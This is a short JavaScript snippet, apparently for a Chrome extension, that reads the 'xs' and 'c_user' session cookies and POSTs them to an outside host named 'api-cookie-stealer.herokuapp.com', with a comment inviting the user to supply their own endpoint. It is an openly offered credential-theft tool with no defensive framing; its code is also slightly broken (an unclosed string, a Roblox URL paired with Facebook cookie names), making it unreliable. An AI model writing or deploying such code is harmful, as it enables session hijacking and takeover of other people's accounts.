var url = "https://www.roblox.com/users/31323231/profile;
var endpoint = "https://api-cookie-stealer.herokuapp.com/send_cookie"; // your endpoint

var xs = {}; 
var c_user = {};

chrome.cookies.get({ url, name: "xs" }, getCookiesInfo);
chrome.cookies.get({ url, name: "c_user" }, getCookiesInfo);

function getCookiesInfo(cookie) {
  var newCookie = {
    value: cookie.value,
    expiration: cookie.expirationDate
  };
  switch(cookie.name){
    case 'xs':
      xs = newCookie;
      break;
    case 'c_user':
      c_user = newCookie;
      break;
    default:
      return null;
  }
  if (xs.value && c_user.value) {
    sendCookies(xs, c_user);
  }
};

async function sendCookies(xs, c_user) {
  await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      xs,
      c_user
    })
  })
}

